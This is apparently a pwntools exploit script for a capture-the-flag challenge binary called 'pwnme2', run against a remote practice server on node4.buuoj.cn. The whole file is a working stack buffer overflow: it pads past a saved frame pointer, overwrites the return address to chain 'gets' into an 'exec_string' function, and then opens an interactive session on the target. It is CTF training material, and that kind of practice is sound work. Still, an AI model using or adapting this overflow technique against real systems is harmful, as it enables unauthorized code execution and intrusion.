from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../pwnme2')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')
# target = process(elf.path)
target = remote('node4.buuoj.cn', 26635)

exec_string = elf.sym['exec_string']
gets = elf.sym['gets']
string = 0x804A060

payload = b'a' * 0x6c + b'a' * 0x4 + p32(gets) + p32(exec_string) + p32(string)
target.sendlineafter('input:', payload)

target.interactive()